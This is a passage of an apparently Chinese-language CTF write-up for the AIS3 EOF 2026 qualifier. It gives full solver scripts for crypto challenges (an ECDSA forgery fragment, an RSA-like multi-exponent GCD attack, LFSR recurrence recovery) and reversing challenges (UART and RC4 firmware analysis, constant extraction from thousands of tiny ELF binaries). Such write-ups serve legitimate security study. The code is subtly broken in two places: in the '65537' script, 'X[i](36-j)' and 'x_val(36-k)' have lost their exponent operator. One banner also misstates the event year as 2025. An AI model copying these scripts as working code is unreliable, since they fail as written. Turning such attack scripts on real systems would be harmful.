            lam = ((3*bx*bx + A) * inverse(2*by, P)) % P
            bx_new = (lam*lam - 2*bx) % P
            by = (lam*(bx - bx_new) - by) % P
            bx = bx_new
            k >>= 1
        return rx, ry
    rf, yf = point_mul(k_forge, Gx, Gy)
    sf = ((new_z + rf * d) * inverse(k_forge, N)) % N
    forged = b'A' + glue + suffix
    conn.interact_solve(rf, sf, forged.hex())
if __name__ == '__main__':
    try:
        solve_mt19937_bitset()
    except KeyboardInterrupt:
        pass

```
![image](/images/ais3-eof-2026-qual/image_7.png)

### 65537   

![image](/images/ais3-eof-2026-qual/image_f.png)    
flag: `EOF{https://www.youtube.com/watch?v=hyvPxeLx_Yg}` 
    
題目給了以下檔案和參數   
`chall.py`：產生一個類 RSA 的加密設定   
`output.txt`：包含 87 筆密文   
系統參數：   
- `n`：一個 1310 bits 的模數（$n = p \cdot q$，其中 $p, q$ 皆為 655 bits 的質數）   
- 一個 36 次多項式 $P(x)$，其係數落在區間 $[0, 65537]$   
- 87 筆密文：   
    
$$
c_i = m^{P(65537 + i)} \pmod n
$$
- 多項式的取值點為：   
    
$$
x = 65537, 65538, \dots
$$
   
解題策略   
此題的安全性直覺上來自於：   
在未知 $n$ 的因數分解下，難以進行模 $n$ 的開根或逆運算。   
然而，本題存在一個關鍵弱點：對「同一個訊息 $m$」，使用了大量「不同但高度結構化的指數」進行加密。   

這使得我們能夠做 Multi-Exponent GCD Attack   
1. 還原模數 $n$   
    第一步是恢復隱藏的模數 $n$。   
    核心觀察   
    - 指數為一個 36 次多項式   
    - 因此：   
        - 在理想狀態下，對指數做 37 階有限差分（finite differences）   
        - 第 37 階差分應為 0   
   
    由於密文形式為：   
    
    $$
    c_i = m^{P(65537+i)} \pmod n
    $$
    這些差分關係在模 $n$ 下仍成立，進而形成線性限制。   
    作法   
    - 根據有限差分關係建立一個 lattice   
    - 使用 LLL / BKZ 進行 lattice reduction   
    - 找到一個向量，其對應值為 $n$ 的一個小倍數   
    - 對結果進行 trial division 移除小因數   
    - 最終成功還原出正確的 1309 bits 模數 $n$   
2. 還原多項式係數比例   
    我們無法直接反推 $P(x)$ 的係數，但可以恢復它們的比例關係。   
    方法概念   
    - 利用反 Vandermonde matrix 的性質   
    - 為每一個係數 $f_k$ 構造一組向量，使其對應到：   
        
        $$
        A_k = m^{D \cdot f_k}
        $$
        其中 $D$ 為已知比例常數   
   
    常數項作為基準   
    - 先計算常數項（第 36 項）對應的：   
        
    $$
    A_{36}
    $$
    - 對每一個其他係數 $f_k$，嘗試尋找：   
        
    $$
    A_{36}^x \equiv A_k^y \pmod n
    $$
   
    這是 MITM 問題。   
    一旦找到 $(x, y)$：   
    基本上在 不到 1 分鐘內即可還原全部 37 個係數的比例關係   
3. Multi-Exponent GCD 攻擊   
    取得所有係數比例後，我們可以重建所有「已知的指數關係」。   
    可用的指數來源   
    1. Lattice 關係   
        
    $$
    V_k = m^{E_k}, \quad E_k \propto f_k
    $$
        （共 37 個）   
    2. 多項式關係（原始密文）   
        $$
        c_i = m^{P(65537+i)}
        $$
        （取其中 10 個）   
    總共有 47 個指數。   
    計算最大公因數   
    
    $$
    g = \gcd(
    E_{\text{latt},0}, \dots, E_{\text{latt},36},
    E_{\text{poly},0}, \dots, E_{\text{poly},9}
    )
    $$
    結果：   
    ```markdown
    g = 1
    ```
 --- 
   
solve script   
```python
from sage.all import *
from Crypto.Util.number import long_to_bytes
from ast import literal_eval
import sys
sys.stdout.reconfigure(line_buffering=True)
print("Starting 65537 Solver Script...")
# 1. Configuration & Data Loading
n_str = "10850218348849388184435839628926643887136150328576801864491695172926404197571570385939626289500386832511402210498393679618152065868746502857101558394210162242772577854755935729867785192549043290755536804070935808559487602145906062653872704574131013288989225871928399716107298421266694464764949626094347467338293230326188948478771610969844826976259603642310765553072611629632109802126514549219571"
n = Integer(n_str)
try:
    cs_data = open("output.txt").read().strip().split(" = ")[1]
    cs = [Integer(x) for x in literal_eval(cs_data)]
    print(f"Loaded n ({n.nbits()} bits) and {len(cs)} ciphertexts")
except Exception as e:
    print(f"Error loading output.txt: {e}")
    sys.exit(1)
# 2. Setup Vandermonde System to Isolate Coefficients
print("Setting up Vandermonde isolation vectors...")
X = [65537 + i for i in range(37)]
M = Matrix(QQ, 37, 37)
for i in range(37):
    for j in range(37):
        M[i, j] = X[i](36-j)
vecs = {}
denoms = []
for idx in range(37):
    tgt = vector(QQ, [0]*idx + [1] + [0]*(36-idx))
    u = M.transpose().solve_right(tgt)
    denoms.append(lcm([x.denominator() for x in u]))
    vecs[idx] = u
D_common = lcm(denoms)
print(f"Common D: {D_common.nbits()} bits")
vecs_scaled = {}
for idx in range(37):
    vecs_scaled[idx] = [int(x * D_common) for x in vecs[idx]]
def compute_prod(vec, cs, n):
    res = 1
    for i, val in enumerate(vec):
        if i >= len(cs): break
        if val == 0: continue
        base = int(cs[i] % n)
        exp = abs(int(val))
        if val < 0:
            base = inverse_mod(base, int(n))
        res = (res * pow(base, exp, int(n))) % int(n)
    return res
# 3. Recover Coefficient Ratios via MITM
print("\nRecovering coefficients relative to f[36] via MITM...")
A36 = compute_prod(vecs_scaled[36], cs, n)
lookup = {}
curr = 1
lookup[curr] = 0
for k in range(1, 65538):
    curr = (curr * A36) % n
    lookup[curr] = k
print(f"Lookup table built ({len(lookup)} entries)")
ratios = {36: (1, 1)}
recovered_count = 1
for k in range(35, -1, -1):
    Ak = compute_prod(vecs_scaled[k], cs, n)
    curr_Ak = 1
    found = False
    for y in range(1, 65538):
        curr_Ak = (curr_Ak * Ak) % n
        if curr_Ak in lookup:
            x = lookup[curr_Ak]
            if x > 0:
                g = gcd(x, y)
                ratios[k] = (x//g, y//g)
                found = True
                recovered_count += 1
                break
    if not found:
        ratios[k] = (0, 1)
print(f"Recovered {recovered_count}/37 coefficients")
# 4. Normalize Ratios to Integer Coefficients
all_dens = [ratios[k][1] for k in range(37)]
L = lcm(all_dens)
props = {}
for k in range(37):
    num, den = ratios[k]
    props[k] = num * (L // den)
g_props = 0
for k in range(37):
    g_props = gcd(g_props, props[k])
if g_props > 1:
    for k in range(37):
        props[k] //= g_props
# 5. Multi-Exponent GCD Attack
print("\nPerforming Multi-Exponent GCD Attack...")
exponents = []
values = []
for k in range(37):
    if props[k] == 0: continue
    exp = D_common * props[k]
    val = compute_prod(vecs_scaled[k], cs, n)
    exponents.append(exp)
    values.append(val)
print("Adding polynomial relations...")
for i in range(10):
    if i >= len(cs): break
    x_val = 65537 + i
    exp = sum(props[k] * (x_val(36-k)) for k in range(37))
    val = cs[i]
    exponents.append(exp)
    values.append(val)
curr_g = exponents[0]
curr_val = values[0]
for i in range(1, len(exponents)):
    next_e = exponents[i]
    next_v = values[i]
    g, u, v = xgcd(curr_g, next_e)
    if u < 0:
        term1 = pow(inverse_mod(curr_val, n), -int(u), n)
    else:
        term1 = pow(curr_val, int(u), n)
    if v < 0:
        term2 = pow(inverse_mod(next_v, n), -int(v), n)
    else:
        term2 = pow(next_v, int(v), n)
    curr_val = (term1 * term2) % n
    curr_g = g
    if curr_g == 1:
        print(f"GCD dropped to 1 at index {i}!")
        break
print(f"Final GCD: {curr_g}")
m_recovered = curr_val
# 6. Check Flag
msg = long_to_bytes(int(m_recovered))
if b"EOF" in msg:
    print(f"\n* FLAG FOUND *")
    print(msg.decode('latin-1', errors='ignore'))
else:
    print("Flag not found directly. Check output manually.")
    print(f"Recovered bytes: {msg}")
```
![image](/images/ais3-eof-2026-qual/image_1f.png)    

### LOL   

![image](/images/ais3-eof-2026-qual/image_e.png)    
flag: `EOF{lfsr_is_a_linear_recurrence_so_is_lfsr_of_lfsr}` 
    
題目實作了一個基於 線性回饋移位暫存器（LFSR） 的自製隨機數產生器，系統名稱為 LOL（LFSR Of LFSRs），由 16 個 LFSR 組成。   
系統特性   
1. 所有 16 個 LFSR 共用同一個 128-bit 的 `mask`（定義回饋多項式）。   
2. 每個 LFSR 都有各自獨立的 `state`。   
3. 存在一個長度為 16 的 `taps`（byte 陣列），每個 LFSR 對應一個 tap。   
4. 每一次 `clock()` 操作中：   
    - 第 $i$ 個 LFSR 會被 clock `taps[i]` 次。   
    - 全域輸出 `x` 為 所有 LFSR 當前 state 的 XOR 總和。   
    - 接著更新 LFSR 列表。原始程式碼如下：   
        ```python
        x = 0
        for t, l in zip(self.taps, self.lfsrs):
            for _ in range(t):
                l.clock()
            x ^= l.state
        self.lfsrs = [LFSR(self.lfsrs[0].mask, x)] + self.lfsrs[:-1]
        
        ```
    - 乍看像是 rotation，但實際上：   
        - 會建立一個新的 LFSR，其 state 為 `x`，插入到最前面   
        - 最後一個 LFSR 會被丟棄   
        - 整體行為更像是一個 queue，其中新狀態由前一輪經過 clock 的所有 state XOR 而成   
- 分析（Analysis）   
    - 線性遞迴結構（Linear Recurrence）   
   
    設 $S_t^{(i)}$ 為第 $t$ 輪時，第 $i$ 個 LFSR 的 state。   
    輸出 $O_t$ 為經過各自 clock 後，所有 state 的 XOR。   
    關鍵觀察：   
    LFSR 的更新在 $GF(2)$ 上是線性運算。   
    若一個序列由特徵多項式為 $P(x)$ 的 LFSR 產生，   
    則該序列滿足由 $P(x)$ 所定義的 線性遞迴關係。   
    而且多個滿足同一線性遞迴的序列，其 XOR 和仍滿足該遞迴。   
    - 系統結構重新解讀   
   
    雖然系統看起來混合了多個 LFSR 並不斷插入新 state，但底層仍然完全受 同一個 128-bit mask 所支配。   
    設：   
    - $O_k$：第 $k$ 次的輸出   
    - $t_j$：第 $j$ 個 tap   
    - $z$：clock 一次所對應的 shift operator（在 $GF(2)[x]/P(x)$ 中）   
   
    則：   
    
    $$
    O_k = \sum_{j=0}^{15} z^{t_j} \cdot (\text{第 } j \text{ 個 LFSR 的 state})
    $$
    由於每一輪都會插入新的 LFSR，其 state 來自前一輪的 Ok​，   
    因此在第 $k$ 輪時，第 $j$ 個位置的 LFSR 實際上對應的是：   
    
    $$
    z^{\tau_j} \cdot O_{k-1-j}
    $$
    其中 $\tau_j$ 是該位置累積的 clock 次數。   
- 結論   
    整個輸出序列 $O_k$ 滿足以下 線性遞迴關係：   
    
    $$
    O_k = \sum_{j=0}^{15} C_j \cdot O_{k-1-j}
    $$
    - 運算在 $GF(2^{128})$ 中   
    - 係數 $C_j$ 為 $z$ 的冪次   
    - 遞迴的特徵多項式正是未知的 mask   
   
解題策略（Solution Strategy）   
1. 還原 Mask（特徵多項式）   
    因為 $O_k$ 滿足一個線性遞迴關係，所以：   
    - 將 $O_k$ 視為 $GF(2)[x]$ 中的多項式 $v_k(x)$   
    - 序列 $v_k$ 會滿足：   
        
    $$
    P(x) \mid \det(\text{Hankel Matrix of } v_k)
    $$
   
    具體作法（使用 SageMath）   
    1. 建立一個 $17 \times 17$ 的 Hankel matrix：   
        
    $$
    H_{i,j} = v_{i+j}
    $$
    2. 計算：   
        
    $$
    D(x) = \det(H)
    $$
    3. 對 $D(x)$ 進行因式分解   
    4. 從所有 irreducible factors 中，找出乘積後 總次數為 128 的組合，即為候選 mask $P(x)$   
2. 求解 Taps 並預測輸出   
    對每個候選 $P(x)$：   
    1. 建立有限域：   
        
    $$
    F = GF(2)[x] / P(x)
    $$
    2. 將已知輸出 $O_0 \sim O_{41}$ 映射進 $F$   
    3. 解線性方程組以求係數 $C_0 \sim C_{15}$：   
    
    $$
    \begin{bmatrix}
    O_{15} & \dots & O_0 \\
    \vdots & & \vdots \\
    O_{30} & \dots & O_{15}
    \end{bmatrix}
    \begin{bmatrix}
    C_{0} \\
    \vdots \\
    C_{15}
    \end{bmatrix}=
    \begin{bmatrix}
    O_{16} \\
    \vdots \\
    O_{31}
    \end{bmatrix}
    $$
   
    驗證結構是否合理：   
    - $C_0 \approx z^{t_0}$   
    - 檢查是否存在 $t_j \in [0, 255]$ 使得：   
        
$$
\frac{C_j}{C_{j-1}} = z^{\pm t_j}
$$
3. 求解 Taps 並預測輸出   
    一旦確認正確的 mask 與 taps：   
    1. 預測下一個輸出：           
    $$
    O_{42} = \sum_{j=0}^{15} C_j \cdot O_{41-j}
    $$
    2. 將 $O_{42}$ 轉回整數 / bytes   
    3. 作為 AES-CTR 的金鑰   
    4. 解密得到 flag   
   
實作細節（Implementation Details）   
- 使用 SageMath 進行所有代數計算   
- Hankel determinant 的次數約為 2159   
- 分解後包含多個小因子與一個大因子   
- 透過組合因子得到 degree = 128 的多項式，即正確 mask   
- 解出 $C_j$ 後，對小範圍（0～255）做離散對數暴力即可還原 taps   

![image](/images/ais3-eof-2026-qual/image_1t.png)    
   
## Reverse   

### bored   
![image](/images/ais3-eof-2026-qual/image_24.png)    
flag: `EOF{ExP3d14i0N_33_15_4he_G0AT}`   

題目給了兩個檔案 firmware.bin、signal.vcd，原則上是要做UART 訊號分析解析 VCD 檔以還原 UART 輸出並理解加密流程找出 flag   
那 VCD 檔案記錄了 UART 資料線隨時間變化的狀態：   
```markdown
#0
1d          # 訊號為高（idle）
#833328
0d          # 訊號為低（start bit）
#1041660
1d          # 訊號為高
...
```
鮑率計算   
透過分析相鄰跳變的時間差：   
- 對所有時間差取 GCD → 104166 ns   
- 鮑率 = 1,000,000,000 / 104166 ≈ 9600 baud   
   
UART Frame 結構   
標準 UART frame：   
- 1 個 start bit（低）   
- 8 個 data bits（LSB first）   
- 1 個 stop bit（高）   
   
Decode 流程   
在每個 start bit 之後，於每個 bit 期間的中心點取樣（1.5、2.5、3.5… 個 bit 週期）：   
```markdown
for each falling edge (start bit):
    for bit_idx in range(8):
        sample_time = start_time + (1.5 + bit_idx) * bit_period
        bit_value = signal_at(sample_time)
        byte |= (bit_value << bit_idx)

```
結果： `b4r3MEt41`   
韌體部分以標準 ARM vector table 開頭：   
- `0x00000000`：初始 stack pointer（ `0x20010000`）   
- `0x00000004`：Reset handler 位址（ `0x00000351`，Thumb mode）   
   
main function 流程   
1. 輸出 `"Input: "`（字串位於 `0x3b4`）   
2. 讀取輸入（最多 `0x40` bytes）   
3. 計算輸入長度   
4. 呼叫位於 `0x44` 的加密函式   
5. 輸出 `"Output: "`（字串位於 `0x3bc`）   
6. 逐 byte 透過 UART 傳送輸出   
   
加密部分是修改過的 RC4：   
```python
def encrypt(input_data, key_data):
    rc4 = RC4_KSA(input_data)
    output = []
    for i in range(len(key_data)):
        if key_data[i] == 0:
            break
        keystream_byte = rc4.next_byte()
        output_byte = keystream_byte ^ key_data[i]
        output.append(output_byte)
    return bytes(output)
```
Key data 儲存在韌體位移 `0x394`：   
```markdown
a2 c3 9e cc 60 35 ee bf f5 7d 78 5a cd d5 c8 52
80 ae c6 19 56 f2 a7 cb d5 0b e1 61 b9 14
```
那後面就是寫 solve script   
```python
import sys
from pathlib import Path
class RC4State:
    def __init__(self, key):
        self.S = list(range(256))
        self.i = 0
        self.j = 0
        j = 0
        for i in range(256):
            j = (j + self.S[i] + key[i % len(key)]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
    def next_byte(self):
        self.i = (self.i + 1) % 256
        self.j = (self.j + self.S[self.i]) % 256
        self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]
        K = self.S[(self.S[self.i] + self.S[self.j]) % 256]
        return K
def decode_uart_from_vcd(vcd_file, bit_period=104166):
    print("[*] Decoding UART signal from VCD file...")
    with open(vcd_file, 'r') as f:
        lines = f.readlines()
    transitions = []
    timestamp = 0
    for line in lines:
        line = line.strip()
        if line.startswith('#'):
            timestamp = int(line[1:])
        elif line in ['0d', '1d']:
            value = int(line[0])
            transitions.append((timestamp, value))
    print(f"[+] Found {len(transitions)} signal transitions")
    print(f"[+] Baud rate: {1e9/bit_period:.1f} baud")
    decoded_bytes = []
    i = 1
    while i < len(transitions) - 1:
        if transitions[i][1] == 0 and transitions[i-1][1] == 1:
            start_time = transitions[i][0]
            byte_val = 0
            for bit_idx in range(8):
                sample_time = start_time + (1.5 + bit_idx) * bit_period
                bit_val = 0
                for j in range(len(transitions)):
                    if transitions[j][0] <= sample_time:
                        bit_val = transitions[j][1]
                    else:
                        break
                byte_val |= (bit_val << bit_idx)
            decoded_bytes.append(byte_val)
            next_time = start_time + 10 * bit_period
            while i < len(transitions) and transitions[i][0] < next_time:
                i += 1
            continue
        i += 1
    result = bytes(decoded_bytes)
    print(f"[+] Decoded {len(result)} bytes: {result}")
    return result
def extract_key_from_firmware(firmware_file, offset=0x394):
    print(f"[*] Extracting key from firmware at offset 0x{offset:x}...")
    with open(firmware_file, 'rb') as f:
        fw = f.read()
    key_data = bytearray()
    for i in range(offset, len(fw)):
        if fw[i] == 0:
            break
        key_data.append(fw[i])
    print(f"[+] Extracted {len(key_data)} byte key: {key_data.hex()}")
    return bytes(key_data)
def firmware_encrypt(input_data, key_data):
    print(f"[*] Encrypting input with firmware algorithm...")
    rc4 = RC4State(input_data)
    output = []
    for i in range(len(key_data)):
        if key_data[i] == 0:
            break
        keystream_byte = rc4.next_byte()
        output_byte = keystream_byte ^ key_data[i]
        output.append(output_byte)
    result = bytes(output)
    print(f"[+] Output: {result}")
    return result
def main():
    print("="*60)
    print("Bored Challenge Solver - AIS3 EOF 2025 CTF")
    print("="*60)
    print()
    vcd_file = Path("signal.vcd")
    firmware_file = Path("firmware.bin")
    if not vcd_file.exists():
        print(f"[-] Error: {vcd_file} not found!")
        sys.exit(1)
    if not firmware_file.exists():
        print(f"[-] Error: {firmware_file} not found!")
        sys.exit(1)
    # Stage 1: Decode UART signal
    uart_output = decode_uart_from_vcd(vcd_file)
    print()
    # Stage 2: Extract key from firmware
    key_data = extract_key_from_firmware(firmware_file)
    print()
    # Stage 3: The twist - UART output is the INPUT, not the flag!
    print("[*] Key insight: The decoded UART output is the INPUT key!")
    print(f"[*] Input key: {uart_output}")
    print()
    # Stage 4: Encrypt the input to get the flag
    flag = firmware_encrypt(uart_output, key_data)
    print()
    print("="*60)
    if flag.startswith(b'EOF{') and flag.endswith(b'}'):
        print(f"[+] FLAG FOUND: {flag.decode('ascii')}")
        print("="*60)
        return 0
    else:
        print(f"[-] Unexpected output: {flag}")
        print("[-] Flag not found!")
        print("="*60)
        return 1
if __name__ == "__main__":
    sys.exit(main())

```
![image](/images/ais3-eof-2026-qual/image_w.png) 

### Structured - Small   

![image](/images/ais3-eof-2026-qual/image_3.png)    
flag: `EOF{5TRuCTuR3D_r3V3R53_3ng1N3eR1Ng_906fac919504945f98}`
     
題目給 11 個 tiny ELF64 binary。   
每個 binary 都會檢查 `argv[1]` 是否等於一個隱藏的 8-byte 常數（部分程式在比較前會進行簡單的旋轉或 `bswap` 操作），若符合則回傳 exit code 0。   
將每個 binary 所期望的輸入片段依序取出並串接，即可組合出完整 flag。   
那 binary 實際流程如下   
- 程式會從 `argv[1]` 讀取最多 8 bytes   
- 並將其打包成一個 64-bit 暫存器值   
- 該值會與`movabs` 立即數常數做比較   
- 有兩個 binary 在比較前會先做位元旋轉（rotate）：   
    - `small-flag_4`： `ror rdx, 0x18`   
        - 輸入必須先做 `rol 0x18` 才能匹配   
    - `small-flag_8`： `ror rdx, 0x10`   
        - 輸入必須先做 `rol 0x10` 才能匹配   
- `small-flag_10` 的處理較特別：   
    - 先執行 `bswap`   
    - 再執行 `shr 8`   
    - 代表實際期望的輸入是 7 個可見字元   
    - checker 會額外期待一個結尾的換行字元（newline）   
    - flag chunk 即為那 7-byte 的部分   
   
solve script   
```python
#!/usr/bin/env python3
import re
import subprocess
from pathlib import Path
def rol(x, r):
    r %= 64
    return ((x << r) | (x >> (64 - r))) & ((1 << 64) - 1)
def extract_expected(binary: Path) -> bytes:
    dis = subprocess.check_output(["objdump", "-d", "-M", "intel", str(binary)], text=True)
    if "bswap" in dis:
        m = re.search(r"movabs rdx,0x([0-9a-fA-F]+)", dis)
        val = int(m.group(1), 16)
        target = (val << 8) & ((1 << 64) - 1)
        packed = int.from_bytes(target.to_bytes(8, "big"), "little")
        data = packed.to_bytes(8, "big")[:7]
        return data
    m = re.search(r"movabs rax,0x([0-9a-fA-F]+)", dis)
    if not m:
        raise RuntimeError(f"No movabs found in {binary}")
    val = int(m.group(1), 16)
    if "ror" in dis:
        m2 = re.search(r"ror\s+rdx,0x([0-9a-fA-F]+)", dis)
        rot = int(m2.group(1), 16)
        packed = rol(val, rot)
        return packed.to_bytes(8, "big")
    return val.to_bytes(8, "big")
def main():
    binaries = sorted(Path(".").glob("small-flag_*"), key=lambda p: int(p.name.split("_")[1]))
    chunks = {}
    for b in binaries:
        data = extract_expected(b)
        chunks[b.name] = data
    for name in sorted(chunks, key=lambda n: int(n.split("_")[1])):
        print(f"{name}: {chunks[name].decode('latin-1')}")
    flag = b"".join(chunks[name] for name in sorted(chunks, key=lambda n: int(n.split("_")[1])) if int(name.split("_")[1]) >= 4)
    print("\nFlag:")
    print(flag.decode("latin-1"))
if __name__ == "__main__":
    main()
```

![image](/images/ais3-eof-2026-qual/image_12.png) 

### Structured - Large 

![image](/images/ais3-eof-2026-qual/image_2a.png)    
flag: `EOF{w31l_d0N3_b0t}`  
   
題目包含 25137 個 tiny ELF binary。   
每一個 binary 都負責驗證隱藏檔案中的下一段 8 bytes。   
透過抽取程式中用來比較的常數，即可在不進行暴力破解的情況下，完整重建檔案。   
重建後的檔案是一張圖片，圖片中顯示出了 flag。   
那分析過程如下   
- 每個 `large-flag_\*` binary 都是 strip 過的 64-bit ELF   
- 控制流程幾乎完全相同   
    程式會：   
    1. 從 `argv[1]` 讀取最多 8 bytes   
    2. 將資料組成一個 64-bit 值（通常在 `rcx` / `rdx`）   
    3. 視情況套用一個簡單轉換（有些沒有）   
    4. 與一個常數進行比較   
   
    使用 `setne`：   
    - 相等 → 回傳 `0`   
    - 不相等 → 回傳 `1`   
   
    該 比較用的常數 就是我們要還原的資料片段   
    有些變體：   
    - 只比較單一 byte（ `cmpb $imm, (reg)`）   
    - 使用 `test reg, reg`（代表該 8-byte chunk 為 0）   
   
    部分 binary 會在比較前對輸入做轉換：   
    - `bswap`   
    - `ror`   
    - `rol`   
    - 必須對常數做反向轉換才能得到正確資料   
   
資料抽取策略   
1. 依數字順序遍歷所有 `large-flag_\*` binary   
2. 反組譯 `.text` 區段，定位最後的 `setne`   
3. 找出 非迴圈中的 `cmp` 指令（即真正做比較的地方）   
4. 還原比較常數：   
    - `cmp reg, imm32`   
        - 將 `imm32`sign-extend 成 64-bit   
    - `cmp reg, reg` 且之前有 `mov / movabs imm`   
        - 使用該 immediate   
    - `cmpb / cmpw / cmpl [reg], imm`   
        - 使用對應大小的 immediate   
    - `test reg, reg`   
        - 該 chunk 的值為 `0`   
5. 若在 `cmp` 前有轉換指令：   
    - `bswap` / `ror` / `rol`   
        - 對常數進行反向操作   
6. 將還原的 8 bytes 依序 append 到輸出 buffer   
7. 將 buffer 寫成一個 PNG 檔案   
   
solve script 如下   
```python
import argparse
import os
import re
import struct
from capstone import Cs, CS_ARCH_X86, CS_MODE_64
from capstone.x86 import (
    X86_OP_IMM,
    X86_OP_MEM,
    X86_OP_REG,
    X86_REG_EAX,
    X86_REG_ECX,
    X86_REG_EDX,
    X86_REG_RAX,
    X86_REG_RCX,
    X86_REG_RDX,
)
from elftools.elf.elffile import ELFFile
def bswap64(x):
    return int.from_bytes(x.to_bytes(8, "big"), "little")
def rol64(x, n):
    n &= 63
    return ((x << n) | (x >> (64 - n))) & 0xFFFFFFFFFFFFFFFF
def ror64(x, n):
    n &= 63
    return ((x >> n) | (x << (64 - n))) & 0xFFFFFFFFFFFFFFFF
def sign_extend_imm32(val):
    imm32 = val & 0xFFFFFFFF
    if imm32 & 0x80000000:
        return imm32 | 0xFFFFFFFF00000000
    return imm32
def is_reg_rcx_rdx(op):
    return op.type == X86_OP_REG and op.reg in (X86_REG_RCX, X86_REG_RDX)
def reg_matches(reg, target):
    if reg == target:
        return True
    if target == X86_REG_RAX and reg == X86_REG_EAX:
        return True
    if target == X86_REG_RCX and reg == X86_REG_ECX:
        return True
    if target == X86_REG_RDX and reg == X86_REG_EDX:
        return True
    return False
def is_back_jump(next_insn, current_addr):
    if not next_insn or not next_insn.mnemonic.startswith("j"):
        return False
    try:
        target = int(next_insn.op_str, 16)
    except Exception:
        return False
    return target < current_addr
def apply_inverse_transforms(imm64, ins, cmp_idx, reg):
    for j in range(cmp_idx - 1, max(cmp_idx - 12, -1), -1):
        insn = ins[j]
        if not insn.operands or insn.operands[0].type != X86_OP_REG:
            continue
        if insn.operands[0].reg != reg:
            continue
        if insn.mnemonic == "bswap":
            imm64 = bswap64(imm64)
        elif insn.mnemonic == "ror":
            if len(insn.operands) == 2 and insn.operands[1].type == X86_OP_IMM:
                imm64 = rol64(imm64, insn.operands[1].imm)
        elif insn.mnemonic == "rol":
            if len(insn.operands) == 2 and insn.operands[1].type == X86_OP_IMM:
                imm64 = ror64(imm64, insn.operands[1].imm)
    return imm64
def extract_chunk(path):
    with open(path, "rb") as f:
        elf = ELFFile(f)
        text = elf.get_section_by_name(".text")
        if text is None:
            return None
        code = text.data()
        addr = text["sh_addr"]
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True
    ins = list(md.disasm(code, addr))
    set_idx = None
    for i, insn in enumerate(ins):
        if insn.mnemonic == "setne":
            set_idx = i
            break
    if set_idx is None:
        return None
    cmp_idx = None
    for i in range(set_idx - 1, max(set_idx - 40, -1), -1):
        if ins[i].mnemonic != "cmp":
            continue
        next_insn = ins[i + 1] if i + 1 < len(ins) else None
        if is_back_jump(next_insn, ins[i].address):
            continue
        ops = ins[i].operands
        if len(ops) == 2 and (is_reg_rcx_rdx(ops[0]) or is_reg_rcx_rdx(ops[1])):
            cmp_idx = i
            break
    if cmp_idx is not None:
        cmp_ins = ins[cmp_idx]
        ops = cmp_ins.operands
        imm_val = None
        reg = None
        imm_from_mov32 = False
        imm_from_cmp_imm = False
        if len(ops) == 2 and ops[1].type == X86_OP_IMM and ops[0].type == X86_OP_REG:
            imm_val = ops[1].imm
            reg = ops[0].reg
            imm_from_cmp_imm = True
        elif len(ops) == 2 and ops[0].type == X86_OP_REG and ops[1].type == X86_OP_REG:
            reg_const = ops[0].reg
            reg_input = ops[1].reg
            for j in range(cmp_idx - 1, max(cmp_idx - 60, -1), -1):
                insn = ins[j]
                if insn.mnemonic not in ("mov", "movabs"):
                    continue
                if len(insn.operands) != 2:
                    continue
                if insn.operands[0].type == X86_OP_REG and insn.operands[1].type == X86_OP_IMM:
                    if reg_matches(insn.operands[0].reg, reg_const):
                        imm_val = insn.operands[1].imm
                        reg = reg_input
                        if insn.operands[0].reg in (X86_REG_EAX, X86_REG_ECX, X86_REG_EDX):
                            imm_from_mov32 = True
                        break
            if imm_val is None:
                reg_const, reg_input = reg_input, reg_const
                for j in range(cmp_idx - 1, max(cmp_idx - 60, -1), -1):
                    insn = ins[j]
                    if insn.mnemonic not in ("mov", "movabs"):
                        continue
                    if len(insn.operands) != 2:
                        continue
                    if insn.operands[0].type == X86_OP_REG and insn.operands[1].type == X86_OP_IMM:
                        if reg_matches(insn.operands[0].reg, reg_const):
                            imm_val = insn.operands[1].imm
                            reg = reg_input
                            if insn.operands[0].reg in (X86_REG_EAX, X86_REG_ECX, X86_REG_EDX):
                                imm_from_mov32 = True
                            break
        if imm_val is None or reg is None:
            return None
        if imm_from_mov32:
            imm64 = imm_val & 0xFFFFFFFF
        elif imm_from_cmp_imm:
            imm64 = sign_extend_imm32(imm_val)
        else:
            imm64 = imm_val & 0xFFFFFFFFFFFFFFFF
        imm64 = apply_inverse_transforms(imm64, ins, cmp_idx, reg)
        return imm64.to_bytes(8, "big")
    for i in range(set_idx - 1, max(set_idx - 20, -1), -1):
        if ins[i].mnemonic == "test":
            ops = ins[i].operands
            if len(ops) == 2 and is_reg_rcx_rdx(ops[0]) and is_reg_rcx_rdx(ops[1]):
                return (0).to_bytes(8, "big")
    for i in range(set_idx - 1, max(set_idx - 10, -1), -1):
        if ins[i].mnemonic == "cmp":
            ops = ins[i].operands
            if len(ops) == 2 and ops[0].type == X86_OP_MEM and ops[1].type == X86_OP_IMM:
                size = ops[0].size
                imm = ops[1].imm & ((1 << (size * 8)) - 1)
                return imm.to_bytes(size, "big")
    return None
def validate_png(data):
    if not data.startswith(b"\x89PNG\r\n\x1a\n"):
        return False, "not a PNG header"
    off = 8
    while off + 8 <= len(data):
        length = struct.unpack(">I", data[off : off + 4])[0]
        ctype = data[off + 4 : off + 8]
        end = off + 12 + length
        if end > len(data):
            return False, f"chunk {ctype!r} out of bounds"
        if ctype == b"IEND":
            return True, "OK"
        off = end
    return False, "no IEND"
def main():
    parser = argparse.ArgumentParser(description="Rebuild PNG from large-flag_* binaries")
    parser.add_argument("dir", nargs="?", default="build-large", help="Directory containing large-flag_* files")
    parser.add_argument("-o", "--output", default="recovered.png", help="Output PNG path")
    args = parser.parse_args()
    files = []
    for name in os.listdir(args.dir):
        if name.startswith("large-flag_"):
            try:
                idx = int(name.split("_", 1)[1])
            except ValueError:
                continue
            files.append((idx, name))
    files.sort()
    out = bytearray()
    missing = []
    for idx, name in files:
        chunk = extract_chunk(os.path.join(args.dir, name))
        if chunk is None:
            missing.append(name)
            continue
        out.extend(chunk)
    if missing:
        raise SystemExit(f"missing {len(missing)} chunks, sample: {missing[:5]}")
    with open(args.output, "wb") as f:
        f.write(out)
    ok, msg = validate_png(out)
    status = "valid" if ok else f"invalid ({msg})"
    print(f"wrote {args.output} ({len(out)} bytes), PNG is {status}")
    try:
        from PIL import Image
        img = Image.open(args.output)
        w, h = img.size
        crop = img.crop((0, max(0, h - 70), w, h))
        crop = crop.resize((crop.width * 3, crop.height * 3), Image.NEAREST)
        crop_path = os.path.splitext(args.output)[0] + "_crop.png"
        crop.save(crop_path)
        print(f"saved {crop_path}")
    except Exception:
        pass
if __name__ == "__main__":
    main()
```
